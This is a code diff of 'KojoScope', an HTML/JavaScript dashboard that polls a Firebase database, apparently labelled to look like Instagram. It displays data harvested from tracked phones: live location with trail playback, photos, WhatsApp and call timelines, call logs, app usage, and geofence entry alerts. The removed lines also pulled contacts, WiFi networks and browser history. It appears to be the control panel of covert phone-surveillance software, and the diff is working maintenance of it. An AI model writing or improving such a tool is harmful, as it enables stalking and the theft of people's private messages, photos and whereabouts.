@@ -57,136 +57,83 @@ td{padding:6px 4px;border-bottom:1px solid var(--border)}
 .alert-banner.warn{background:rgba(255,202,40,.15);color:var(--accent);border-bottom:1px solid rgba(255,202,40,.3)}
 .alert-banner.error{background:rgba(248,81,73,.15);color:var(--danger);border-bottom:1px solid rgba(248,81,73,.3)}
 @media(min-width:768px){
-  body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;height:100vh}
-  .header{grid-column:1/-1}
-  .sidebar{grid-column:1;overflow:hidden;display:flex;flex-direction:column;border-right:1px solid var(--border)}
-  .map-wrap{grid-column:2;grid-row:2}
-  #map{height:100%}
-  .content{max-height:none;flex:1}
-  .tabs+.content{flex:1;overflow-y:auto}
+body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;height:100vh}
+.header{grid-column:1/-1}
+.sidebar{grid-column:1;overflow:hidden;display:flex;flex-direction:column;border-right:1px solid var(--border)}
+.map-wrap{grid-column:2;grid-row:2}
+#map{height:100%}
+.content{max-height:none;flex:1}
+.tabs+.content{flex:1;overflow-y:auto}
 }
 </style>
 </head>
 <body>
-
 <div class="header">
-  <h1>&#x1F6F0; KojoScope</h1>
-  <select class="device-select" id="deviceSelect"><option value="">No devices</option></select>
-  <span class="status" id="statusDot">&#x25CF; Live</span>
-  <span class="read-budget" id="readBudget"></span>
+<h1>&#x1F6F0; KojoScope</h1>
+<select class="device-select" id="deviceSelect"><option value="">No devices</option></select>
+<span class="status" id="statusDot">&#x25CF; Live</span>
+<span class="read-budget" id="readBudget"></span>
 </div>
-
 <div class="alert-banner" id="alertBanner"></div>
-
 <div class="sidebar">
-  <div class="tabs" id="tabBar">
-    <button class="tab-btn active" data-tab="live">&#x1F4CD; Live</button>
-    <button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
-    <button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
-    <button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
-    <button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
-    <button class="tab-btn" data-tab="contacts">&#x1F4F1; Contacts</button>
-    <button class="tab-btn" data-tab="wifi">&#x1F4F6; WiFi</button>
-    <button class="tab-btn" data-tab="browser">&#x1F310; Browser</button>
-    <button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
-  </div>
-  <div class="content" id="tabContent">
-    <div class="active" id="tab-live">
-      <div class="grid">
-        <div><div class="label">Latitude</div><div class="value" id="latVal">--</div></div>
-        <div><div class="label">Longitude</div><div class="value" id="lngVal">--</div></div>
-        <div><div class="label">Accuracy</div><div class="value" id="accVal">--</div></div>
-        <div><div class="label">Speed</div><div class="value" id="spdVal">--</div></div>
-        <div><div class="label">Device</div><div class="value" id="devVal">--</div></div>
-        <div><div class="label">Battery</div><div class="value" id="batVal">--</div></div>
-        <div><div class="label">WiFi</div><div class="value" id="wifiVal">--</div></div>
-        <div><div class="label">Last Seen</div><div class="value" id="seenVal">--</div></div>
-        <div><div class="label">Updated</div><div class="value" id="updatedVal" style="font-size:11px">--</div></div>
-      </div>
-      <div class="coord-box" id="coordBox" style="cursor:pointer" title="Click to copy">--</div>
-      <div class="label">Address</div>
-      <div class="value" id="addrVal" style="font-size:13px;color:var(--muted)">--</div>
-    </div>
-    <div id="tab-photos">
-      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
-        <span class="label">Photos</span>
-        <span id="photoUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
-      </div>
-      <div class="photo-grid" id="photoGrid"><div class="label">No photos yet</div></div>
-    </div>
-    <div id="tab-timeline">
-      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
-        <span class="label">Timeline</span>
-        <span id="timelineUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
-      </div>
-      <div class="filter-chips" id="timelineChips">
-        <span class="chip active" data-filter="all">All</span>
-        <span class="chip" data-filter="location">&#x1F4CD; Location</span>
-        <span class="chip" data-filter="call">&#x1F4DE; Call</span>
-        <span class="chip" data-filter="whatsapp">&#x1F4AC; WhatsApp</span>
-      </div>
-      <div id="timelineList"></div>
-    </div>
-    <div id="tab-calls">
-      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
-        <span class="label">Call Logs</span>
-        <span id="callsUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
-      </div>
-      <table><thead><tr><th>Time</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsBody"></tbody></table>
-    </div>
-    <div id="tab-apps">
-      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
-        <span class="label">App Usage</span>
-        <span id="appsUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
-      </div>
-      <div id="appsChart"></div>
-    </div>
-    <div id="tab-geofence"><div id="geofenceList"></div></div>
-    <div id="tab-contacts">
-      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
-        <span class="label">Contacts</span>
-        <span id="contactsUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
-      </div>
-      <input type="text" id="contactsSearch" placeholder="Search by name or number..." style="width:100%;background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:var(--radius);font-size:12px;margin-bottom:8px">
-      <div id="contactsList"></div>
-    </div>
-    <div id="tab-wifi">
-      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
-        <span class="label">WiFi Networks</span>
-        <span id="wifiUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
-      </div>
-      <div id="wifiList"></div>
-    </div>
-    <div id="tab-browser">
-      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
-        <span class="label">Browser History</span>
-        <span id="browserUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
-      </div>
-      <div id="browserList"></div>
-    </div>
-  </div>
+<div class="tabs" id="tabBar">
+<button class="tab-btn active" data-tab="live">&#x1F4CD; Live</button>
+<button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
+<button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
+<button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
+<button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
+<button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
 </div>
-
+<div class="content" id="tabContent">
+<div class="active" id="tab-live">
+<div class="grid">
+<div><div class="label">Latitude</div><div class="value" id="latVal">--</div></div>
+<div><div class="label">Longitude</div><div class="value" id="lngVal">--</div></div>
+<div><div class="label">Accuracy</div><div class="value" id="accVal">--</div></div>
+<div><div class="label">Speed</div><div class="value" id="spdVal">--</div></div>
+<div><div class="label">Device</div><div class="value" id="devVal">--</div></div>
+<div><div class="label">Battery</div><div class="value" id="batVal">--</div></div>
+<div><div class="label">WiFi</div><div class="value" id="wifiVal">--</div></div>
+<div><div class="label">Last Seen</div><div class="value" id="seenVal">--</div></div>
+<div><div class="label">Updated</div><div class="value" id="updatedVal" style="font-size:11px">--</div></div>
+</div>
+<div class="coord-box" id="coordBox" style="cursor:pointer" title="Click to copy">--</div>
+<div class="label">Address</div>
+<div class="value" id="addrVal" style="font-size:13px;color:var(--muted)">--</div>
+</div>
+<div id="tab-photos"><div class="photo-grid" id="photoGrid"><div class="label">No photos yet</div></div></div>
+<div id="tab-timeline">
+<div class="filter-chips" id="timelineChips">
+<span class="chip active" data-filter="all">All</span>
+<span class="chip" data-filter="location">&#x1F4CD; Location</span>
+<span class="chip" data-filter="call">&#x1F4DE; Call</span>
+<span class="chip" data-filter="whatsapp">&#x1F4AC; WhatsApp</span>
+</div>
+<div id="timelineList"></div>
+</div>
+<div id="tab-calls"><table><thead><tr><th>Time</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsBody"></tbody></table></div>
+<div id="tab-apps"><div id="appsChart"></div></div>
+<div id="tab-geofence"><div id="geofenceList"></div></div>
+</div>
+</div>
 <div class="map-wrap">
-  <div id="map"></div>
-  <div class="playback-bar" id="playbackBar" style="display:none">
-    <button id="playBtn">&#x25B6;</button>
-    <button id="rewindBtn">&#x23EE;</button>
-    <select id="speedSelect" style="background:var(--bg);color:var(--text);border:1px solid var(--border);font-size:11px;padding:2px 4px">
-      <option value="1">1x</option><option value="5">5x</option><option value="10" selected>10x</option><option value="50">50x</option>
-    </select>
-    <input type="range" id="playScrubber" min="0" max="100" value="0">
-    <span class="ts" id="playTs">--</span>
-    <span class="ts" id="playCount">0/0</span>
-  </div>
+<div id="map"></div>
+<div class="playback-bar" id="playbackBar" style="display:none">
+<button id="playBtn">&#x25B6;</button>
+<button id="rewindBtn">&#x23EE;</button>
+<select id="speedSelect" style="background:var(--bg);color:var(--text);border:1px solid var(--border);font-size:11px;padding:2px 4px">
+<option value="1">1x</option><option value="5">5x</option><option value="10" selected>10x</option><option value="50">50x</option>
+</select>
+<input type="range" id="playScrubber" min="0" max="100" value="0">
+<span class="ts" id="playTs">--</span>
+<span class="ts" id="playCount">0/0</span>
 </div>
-
+</div>
 <div class="lightbox" id="lightbox"><img id="lightboxImg" alt=""></div>
 
 <script>
 // --- Firebase Config ---
 const RTDB = 'https://instgram-7148c-default-rtdb.europe-west1.firebasedatabase.app';
-const FIRESTORE = 'https://firestore.googleapis.com/v1/projects/instgram-7148c/databases/(default)/documents';
 const PKT = 'Asia/Karachi';
 
 // --- State ---
@@ -205,16 +152,10 @@ let playbackRunning = false;
 let lastUpdateTime = 0;
 let playbackIdx = 0;
 let playbackTimer = null;
-let cameraHome = null;
-function setCategoryTime(cat, ts) {
-  if (!ts) return;
-  const el = document.getElementById(cat + 'Updated');
-  if (el) el.textContent = pkt(ts);
-}
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 5000, hist: 30000, meta: 30000, photos: 30000, apps: 30000, contacts: 60000, wifi: 60000, browser: 60000 };
+const BASE_INTERVALS = { loc: 3000, hist: 60000, meta: 30000, photos: 60000, apps: 60000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -229,11 +170,10 @@ function trackRead(count = 1) {
   if (readBudget.day !== today) { readBudget = { count: 0, day: today }; }
   readBudget.count += count;
   localStorage.setItem('readBudget', JSON.stringify(readBudget));
-  const pct = Math.round(readBudget.count / 50000 * 100);
   document.getElementById('readBudget').textContent = `\u{1F4CA} ${readBudget.count.toLocaleString()}/50K`;
   if (readBudget.count > 40000) {
     intervals.loc = 10000; intervals.hist = 60000; intervals.meta = 60000;
-    intervals.photos = 120000; intervals.apps = 120000; intervals.contacts = 120000; intervals.wifi = 120000; intervals.browser = 120000;
+    intervals.photos = 120000; intervals.apps = 120000;
     showAlert('Approaching Firebase read limit \u2014 reduced poll rate', 'warn');
   } else {
     intervals = { ...BASE_INTERVALS };
@@ -256,6 +196,7 @@ function geocode(lat, lng) {
     if (!nomProcessing) processNomQueue();
   });
 }
+
 async function processNomQueue() {
   nomProcessing = true;
   while (nomQueue.length) {
@@ -297,6 +238,7 @@ function simplify(points, tolerance = 300) {
   }
   return [first, last];
 }
+
 function perpendicularDist(p, a, b) {
   const dx = b[0] - a[0], dy = b[1] - a[1];
   const num = Math.abs(dy * p[0] - dx * p[1] + b[0] * a[1] - b[1] * a[0]);
@@ -320,6 +262,7 @@ function saveGeofences() {
   localStorage.setItem('geofences', JSON.stringify(geofences));
   renderGeofenceList();
 }
+
 function addGeofence(lat, lng) {
   const name = prompt('Geofence name:');
   if (!name) return;
@@ -327,6 +270,7 @@ function addGeofence(lat, lng) {
   saveGeofences();
   renderGeofences();
 }
+
 function renderGeofences() {
   map.eachLayer(l => { if (l._isGeofence) map.removeLayer(l); });
   geofences.filter(g => g.active).forEach(g => {
@@ -334,16 +278,26 @@ function renderGeofences() {
       ._isGeofence = true;
   });
 }
+
+// FIX: Guard Notification API — not available in all iOS Safari contexts
+function sendNotification(title, body) {
+  if (typeof Notification === 'undefined') return;
+  if (Notification.permission === 'granted') {
+    try { new Notification(title, { body }); } catch {}
+  }
+}
+
 function checkGeofences(lat, lng) {
   geofences.filter(g => g.active).forEach(g => {
     const dist = haversine(lat, lng, g.lat, g.lng);
     const inside = dist <= g.radius;
     if (inside && !alertedZones.has(g.id)) {
-      if (Notification.permission === 'granted') new Notification('Geofence: ' + g.name, { body: 'Device entered ' + g.name });
+      sendNotification('Geofence: ' + g.name, 'Device entered ' + g.name);
       alertedZones.add(g.id);
     } else if (!inside) alertedZones.delete(g.id);
   });
 }
+
 function renderGeofenceList() {
   const el = document.getElementById('geofenceList');
   if (!geofences.length) { el.innerHTML = '<div class="label">Right-click map to add geofence</div>'; return; }
@@ -360,6 +314,7 @@ function renderGeofenceList() {
       </div>
     </div>`).join('');
 }
+
 document.addEventListener('click', e => {
   const btn = e.target.closest('[data-action]');
   if (!btn) return;
@@ -369,6 +324,7 @@ document.addEventListener('click', e => {
   if (btn.dataset.action === 'toggle') { gf.active = !gf.active; saveGeofences(); renderGeofences(); }
   if (btn.dataset.action === 'delete') { geofences = geofences.filter(g => g.id !== id); saveGeofences(); renderGeofences(); }
 });
+
 document.addEventListener('input', e => {
   if (e.target.classList.contains('gf-radius')) {
     const id = e.target.dataset.gf;
@@ -376,6 +332,7 @@ document.addEventListener('input', e => {
     if (gf) { gf.radius = parseInt(e.target.value); saveGeofences(); renderGeofences(); }
   }
 });
+
 map.on('contextmenu', e => addGeofence(e.latlng.lat, e.latlng.lng));
 
 // --- Photo Lightbox ---
@@ -419,6 +376,7 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
 function stopPolling() {
   pollTimers.forEach(t => clearTimeout(t)); pollTimers = [];
 }
+
 function startPolling() {
   stopPolling();
   schedulePoll('loc', intervals.loc, pollLocation);
@@ -426,10 +384,8 @@ function startPolling() {
   schedulePoll('photos', intervals.photos, pollPhotos);
   schedulePoll('apps', intervals.apps, pollApps);
   schedulePoll('hist', intervals.hist, pollHistory);
-  schedulePoll('contacts', intervals.contacts, pollContacts);
-  schedulePoll('wifi', intervals.wifi, pollWifi);
-  schedulePoll('browser', intervals.browser, pollBrowser);
 }
+
 function schedulePoll(name, interval, fn) {
   async function run() {
     try { await fn(); } catch {}
@@ -439,159 +395,61 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  await Promise.allSettled([pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollContacts(), pollWifi(), pollBrowser()]);
+  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory()];
+  for (const fn of fns) { try { await fn; } catch {} }
 }
 
 // --- Firebase helpers ---
-// Firestore REST API (has CORS) — preferred
-async function fetchFirestore(path) {
+// RTDB-only approach — Firebase RTDB sends Access-Control-Allow-Origin: *
+// on all GET responses, so plain fetch() works from ANY browser including iOS Safari.
+// Firestore REST API does NOT support browser CORS reliably, so we never use it here.
+
+async function fetchRTDB(path, query) {
   trackRead();
   try {
-    const r = await fetch(`${FIRESTORE}/${path}`);
+    const qs = query ? `?${query}` : '';
+    const r = await fetch(`${RTDB}/${path}.json${qs}`);
     if (!r.ok) return null;
     return r.json();
   } catch { return null; }
 }
-async function listFirestoreDocs(path) {
-  trackRead();
-  try {
-    const r = await fetch(`${FIRESTORE}/${path}?pageSize=50`);
-    if (!r.ok) return [];
-    const data = await r.json();
-    return data.documents || [];
-  } catch { return []; }
-}
-async function runFirestoreQuery(parentDoc, collectionId, field, op, value, limit = 50) {
-  trackRead();
-  try {
-    const body = JSON.stringify({
-      structuredQuery: {
-        from: [{ collectionId }],
-        where: { fieldFilter: { field: { fieldPath: field }, op, value: { integerValue: String(value) } } },
-        orderBy: [{ field: { fieldPath: field }, direction: 'ASCENDING' }],
-        limit
-      }
-    });
-    const r = await fetch(`${FIRESTORE}/${parentDoc}:runQuery`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' }, body
-    });
-    if (!r.ok) return [];
-    const results = await r.json();
-    return results.filter(r => r.document).map(r => r.document);
-  } catch { return []; }
-}
-// Collection group query across ALL parent docs (e.g., all `info` docs under devices/*/)
-async function fetchFirestoreCollectionGroup(collectionId, limit = 50) {
-  trackRead();
-  try {
-    const body = JSON.stringify({
-      structuredQuery: {
-        from: [{ collectionId, allDescendants: true }],
-        limit
-      }
-    });
-    const r = await fetch(`${FIRESTORE}:runQuery`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' }, body
-    });
-    if (!r.ok) return [];
-    const results = await r.json();
-    return results.filter(r => r.document).map(r => r.document);
-  } catch { return []; }
-}
-// RTDB uses JSONP (no CORS on RTDB) — fallback only
-function fetchRTDB(path, query) {
-  trackRead();
-  return new Promise((resolve) => {
-    const cb = '_rtdb' + Date.now();
-    window[cb] = function(data) { cleanup(); resolve(data); };
-    const s = document.createElement('script');
-    const qs = query ? '?' + query + '&' : '?';
-    s.src = `${RTDB}/${path}.json${qs}callback=${cb}`;
-    const timeout = setTimeout(() => { cleanup(); resolve(null); }, 10000);
-    function cleanup() { clearTimeout(timeout); delete window[cb]; if (s.parentNode) s.parentNode.removeChild(s); }
-    s.onerror = cleanup;
-    document.head.appendChild(s);
-  });
-}
-// Try Firestore first, fall back to RTDB JSONP for backward compat
-async function fetchMetrics(id) {
-  const doc = await fetchFirestore(`devices/${id}/metrics/latest`);
-  if (doc && doc.fields) return firestoreFieldsToObj(doc.fields);
-  const m = await fetchRTDB(`devices/${id}/metrics/latest`);
-  return m;
-}
-function firestoreFieldsToObj(fields) {
-  const o = {};
-  for (const k in fields) {
-    const v = fields[k];
-    if (v.stringValue !== undefined) o[k] = v.stringValue;
-    else if (v.integerValue !== undefined) o[k] = parseInt(v.integerValue);
-    else if (v.doubleValue !== undefined) o[k] = v.doubleValue;
-    else if (v.booleanValue !== undefined) o[k] = v.booleanValue;
-    else o[k] = v;
-  }
-  return o;
-}
 
 async function fetchDevices() {
-  // Primary: RTDB shallow query (works on all browsers incl. Safari)
-  const data = await fetchRTDB('devices', 'shallow=true');
-  if (data) {
-    devices = Object.keys(data).reduce((acc, id) => { acc[id] = { id, label: id.slice(0,8) + '...' }; return acc; }, {});
-    const sel = document.getElementById('deviceSelect');
-    const keys = Object.keys(devices);
-    if (keys.length) {
-      sel.innerHTML = keys.map(k => `<option value="${k}">${devices[k].label}</option>`).join('');
-      if (!selectedDevice || !keys.includes(selectedDevice)) selectedDevice = keys[0];
-      sel.value = selectedDevice;
-      // Try Firestore for nicer labels (non-blocking)
-      fetchFirestoreCollectionGroup('info', 20).then(infoDocs => {
-        if (infoDocs && infoDocs.length) {
-          for (const doc of infoDocs) {
-            const parts = doc.name.split('/');
-            const idx = parts.indexOf('devices');
-            if (idx < 0 || !parts[idx + 1]) continue;
-            const id = parts[idx + 1];
-            const fields = doc.fields || {};
-            const model = fields.deviceModel?.stringValue || '';
-            const manuf = fields.manufacturer?.stringValue || '';
-            if (model && devices[id]) {
-              devices[id].label = [manuf, model].filter(Boolean).join(' ') || id.slice(0, 8);
-            }
-          }
-          const sel2 = document.getElementById('deviceSelect');
-          sel2.innerHTML = Object.keys(devices).map(k => `<option value="${k}">${devices[k].label}</option>`).join('');
-          sel2.value = selectedDevice;
-        }
-      }).catch(() => {});
-      return;
-    }
-  }
-
-  // Fallback: Firestore collection group query
-  const infoDocs = await fetchFirestoreCollectionGroup('info', 20);
-  if (infoDocs && infoDocs.length) {
-    devices = {};
-    const sel = document.getElementById('deviceSelect');
-    const opts = [];
-    for (const doc of infoDocs) {
-      const parts = doc.name.split('/');
-      const idx = parts.indexOf('devices');
-      if (idx < 0 || !parts[idx + 1]) continue;
-      const id = parts[idx + 1];
-      const fields = doc.fields || {};
-      const label = [fields.manufacturer?.stringValue, fields.deviceModel?.stringValue].filter(Boolean).join(' ') || id.slice(0, 8);
-      devices[id] = { id, label };
-      opts.push(`<option value="${id}">${label}</option>`);
-    }
-    sel.innerHTML = opts.join('');
-    if (!selectedDevice || !devices[selectedDevice]) selectedDevice = Object.keys(devices)[0];
-    sel.value = selectedDevice;
+  // Fetch all device IDs via shallow=true (fast, minimal data)
+  const keys = await fetchRTDB('devices', 'shallow=true');
+  if (!keys || typeof keys !== 'object') {
+    document.getElementById('statusDot').textContent = '\u2716 No data';
+    document.getElementById('statusDot').className = 'status warn';
     return;
   }
+  devices = {};
+  const sel = document.getElementById('deviceSelect');
+  const ids = Object.keys(keys);
+  if (!ids.length) {
+    document.getElementById('statusDot').textContent = '\u2716 No devices';
+    document.getElementById('statusDot').className = 'status warn';
+    return;
+  }
+  // Enrich with model names via info nodes (non-blocking)
+  ids.forEach(id => { devices[id] = { id, label: id.slice(0, 8) + '...', model: '', manuf: '' }; });
+  sel.innerHTML = ids.map(k => `<option value="${k}">${devices[k].label}</option>`).join('');
+  if (!selectedDevice || !ids.includes(selectedDevice)) selectedDevice = ids[0];
+  sel.value = selectedDevice;
 
-  document.getElementById('statusDot').textContent = '\u2716 No data';
-  document.getElementById('statusDot').className = 'status warn';
+  // Enrich with device model names (async — non-blocking)
+  (async () => {
+    try {
+      for (const id of ids) {
+        const info = await fetchRTDB(`devices/${id}/info`);
+        if (info && info.deviceModel) {
+          const label = [info.manufacturer, info.deviceModel].filter(Boolean).join(' ') || id.slice(0, 8);
+          if (devices[id]) devices[id].label = label;
+        }
+      }
+      const opt = document.querySelector(`#deviceSelect option[value="${selectedDevice}"]`);
+      if (opt && devices[selectedDevice]) opt.textContent = devices[selectedDevice].label;
+    } catch {}
+  })();
 }
 
 async function pollLocation() {
@@ -602,18 +460,19 @@ async function pollLocation() {
   updateMap(loc);
   checkGeofences(loc.lat, loc.lng);
 }
+
 async function pollMeta() {
   if (!selectedDevice) return;
-  const m = await fetchMetrics(selectedDevice);
+  const m = await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
   if (!m) return;
   document.getElementById('batVal').textContent = (m.batteryPct || '--') + '%' + (m.isCharging ? ' \u26A1' : '');
   document.getElementById('wifiVal').textContent = m.wifiSsid || '--';
   document.getElementById('devVal').textContent = m.deviceModel || '--';
-  // Update device label in dropdown with model name if known
   if (m.deviceModel && devices[selectedDevice]) {
     const label = [m.manufacturer, m.deviceModel].filter(Boolean).join(' ');
     devices[selectedDevice].label = label;
-    document.querySelector(`#deviceSelect option[value="${selectedDevice}"]`).textContent = label;
+    const opt = document.querySelector(`#deviceSelect option[value="${selectedDevice}"]`);
+    if (opt) opt.textContent = label;
   }
   const ts = parseInt(m.ts_ms || '0');
   if (ts > lastUpdateTime) {
@@ -623,75 +482,44 @@ async function pollMeta() {
     document.getElementById('statusDot').className = 'status';
   }
 }
-let lastPhotoTs = 0;
+
 async function pollPhotos() {
   if (!selectedDevice) return;
-  let docs;
-  if (lastPhotoTs > 0) {
-    docs = await runFirestoreQuery(`devices/${selectedDevice}`, 'photos', 'timestamp', 'GREATER_THAN', lastPhotoTs, 10);
-  } else {
-    docs = await listFirestoreDocs(`devices/${selectedDevice}/photos`);
-  }
-  // If no Firestore docs, try RTDB
-  if (!docs || !docs.length) {
-    const rtdbData = await fetchRTDB(`devices/${selectedDevice}/photos`);
-    if (rtdbData && typeof rtdbData === 'object') {
-      docs = Object.entries(rtdbData).map(([k,v]) => {
-        const f = {};
-        if (v.data) f.data = {stringValue: v.data};
-        if (v.timestamp) f.timestamp = {integerValue: String(v.timestamp)};
-        return { name: k, fields: f };
-      }).sort((a,b) => {
-        const ta = parseInt(a.fields?.timestamp?.integerValue || '0');
-        const tb = parseInt(b.fields?.timestamp?.integerValue || '0');
-        return tb - ta;
-      });
-    }
+  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/photos`);
+  if (!rtdbData || typeof rtdbData !== 'object') {
+    document.getElementById('photoGrid').innerHTML = '<div class="label">No photos yet</div>';
+    return;
   }
   const grid = document.getElementById('photoGrid');
-  for (const doc of (docs || [])) {
-    const ts = parseInt(doc.name?.split('/')?.pop() || doc.name || '0');
+  const entries = Object.entries(rtdbData).sort((a, b) => (parseInt(b[0]) || 0) - (parseInt(a[0]) || 0));
+  for (const [ts, doc] of entries) {
     if (cachedPhotos[ts]) continue;
-    const fields = doc.fields || {};
-    const data = fields.data?.stringValue || '';
-    const docTs = parseInt(fields.timestamp?.integerValue || '0');
-    if (docTs > lastPhotoTs) lastPhotoTs = docTs;
+    const data = doc.data || '';
+    const docTs = parseInt(ts);
     if (data && data.startsWith('/9j/')) {
       cachedPhotos[ts] = data;
       const img = document.createElement('img');
       img.src = 'data:image/jpeg;base64,' + data;
-      img.alt = pkt(ts);
-      img.title = pkt(ts);
+      img.alt = pkt(docTs);
+      img.title = pkt(docTs);
       grid.prepend(img);
     }
   }
   if (!Object.keys(cachedPhotos).length) grid.innerHTML = '<div class="label">No photos yet</div>';
 }
+
 async function pollApps() {
   if (!selectedDevice) return;
-  let docs = await listFirestoreDocs(`devices/${selectedDevice}/apps`);
-  // Fallback to RTDB
-  if (!docs || !docs.length) {
-    const rtdbData = await fetchRTDB(`devices/${selectedDevice}/apps`);
-    if (rtdbData && typeof rtdbData === 'object') {
-      docs = Object.values(rtdbData).map(v => ({
-        fields: {
-          appName: {stringValue: v.appName || v.name || '?'},
-          totalForegroundMs: {integerValue: String(v.totalForegroundMs || v.ms || 0)},
-          lastUsedMs: {integerValue: String(v.lastUsedMs || v.ts || 0)}
-        }
-      }));
-    }
-  }
+  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/apps`);
   const chart = document.getElementById('appsChart');
-  if (!docs || !docs.length) {
+  if (!rtdbData || typeof rtdbData !== 'object') {
     chart.innerHTML = '<div class="label">No app usage data yet</div>';
     return;
   }
-  const sorted = docs.map(d => {
-    const f = d.fields || {};
-    return { name: f.appName?.stringValue || '?', ms: parseInt(f.totalForegroundMs?.integerValue || '0') };
-  }).sort((a, b) => b.ms - a.ms).slice(0, 15);
+  const sorted = Object.values(rtdbData).map(v => ({
+    name: v.appName || v.packageName || '?',
+    ms: parseInt(v.totalForegroundMs || '0')
+  })).sort((a, b) => b.ms - a.ms).slice(0, 15);
   const maxMs = sorted.length ? sorted[0].ms : 1;
   chart.innerHTML = sorted.map(a => `
     <div class="bar-row">
@@ -700,30 +528,17 @@ async function pollApps() {
       <span class="bar-val">${(a.ms/60000).toFixed(1)}m</span>
     </div>`).join('');
 }
+
 async function pollHistory() {
   if (!selectedDevice) return;
-  let docs = await listFirestoreDocs(`devices/${selectedDevice}/timeline`);
-  // Fallback to RTDB
-  if (!docs || !docs.length) {
-    const rtdbData = await fetchRTDB(`devices/${selectedDevice}/timeline`);
-    if (rtdbData && typeof rtdbData === 'object') {
-      docs = Object.entries(rtdbData).map(([k,v]) => ({
-        name: k,
-        fields: {
-          type: {stringValue: v.type || 'event'},
-          ts_ms: {integerValue: String(v.ts_ms || v.timestamp || 0)},
-          contactName: {stringValue: v.contactName || v.contact || v.contactNumber || ''},
-          messagePreview: {stringValue: v.messagePreview || v.message || ''},
-          duration: {stringValue: v.duration || ''},
-          direction: {stringValue: v.direction || ''}
-        }
-      })).sort((a,b) => {
-        const ta = parseInt(a.fields.ts_ms?.integerValue || '0');
-        const tb = parseInt(b.fields.ts_ms?.integerValue || '0');
-        return tb - ta;
-      });
-    }
+  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/timeline`);
+  if (!rtdbData || typeof rtdbData !== 'object') {
+    document.getElementById('timelineList').innerHTML = '<div class="label">No entries</div>';
+    document.getElementById('callsBody').innerHTML = '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
+    return;
   }
+  const docs = Object.values(rtdbData)
+    .sort((a, b) => (parseInt(b.ts_ms) || 0) - (parseInt(a.ts_ms) || 0));
   renderTimeline(docs.slice(0, 30));
   renderCalls(docs.slice(0, 30));
 }
@@ -736,25 +551,29 @@ function updateLocationUI(loc) {
   document.getElementById('spdVal').textContent = (loc.speed || 0).toFixed(1) + ' m/s';
   document.getElementById('seenVal').textContent = pkt(loc.ts_ms || Date.now());
   document.getElementById('coordBox').textContent = `${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}`;
-  document.getElementById('coordBox').onclick = () => navigator.clipboard.writeText(`${loc.lat},${loc.lng}`).then(() => showAlert('Copied!'));
-
+  document.getElementById('coordBox').onclick = () => {
+    const txt = `${loc.lat},${loc.lng}`;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(txt).then(() => showAlert('Copied!')).catch(() => showAlert('Copy failed', 'error'));
+    }
+  };
   geocode(loc.lat, loc.lng).then(d => {
     if (d) document.getElementById('addrVal').textContent = d.display_name || '--';
   });
 }
+
 function updateMap(loc) {
   const latlng = [loc.lat, loc.lng];
   if (marker) { marker.setLatLng(latlng); }
   else { marker = L.marker(latlng).addTo(map).bindPopup('Current'); }
   if (accuracyCircle) map.removeLayer(accuracyCircle);
   accuracyCircle = L.circle(latlng, { radius: loc.accuracy || 50, color: '#3fb950', fillOpacity: 0.1 }).addTo(map);
-
   locationHistory.push([loc.lat, loc.lng]);
   if (locationHistory.length > 500) locationHistory.shift();
   updateTrail();
-
   if (locationHistory.length === 1) map.setView(latlng, 15);
 }
+
 function updateTrail() {
   if (trail) map.removeLayer(trail);
   if (locationHistory.length < 2) return;
@@ -767,11 +586,13 @@ function updateTrail() {
 
 // --- Playback ---
 let playbackPoints = [];
+
 function setupPlayback(pts) {
   playbackPoints = pts;
   const scrubber = document.getElementById('playScrubber');
   scrubber.max = Math.max(0, pts.length - 1);
 }
+
 document.getElementById('playBtn').addEventListener('click', function() {
   if (playbackRunning) { playbackRunning = false; this.textContent = '\u25B6';
     if (playbackTimer) clearInterval(playbackTimer); return; }
@@ -790,6 +611,7 @@ document.getElementById('playBtn').addEventListener('click', function() {
     playbackIdx++;
   }, 1000 / speed);
 });
+
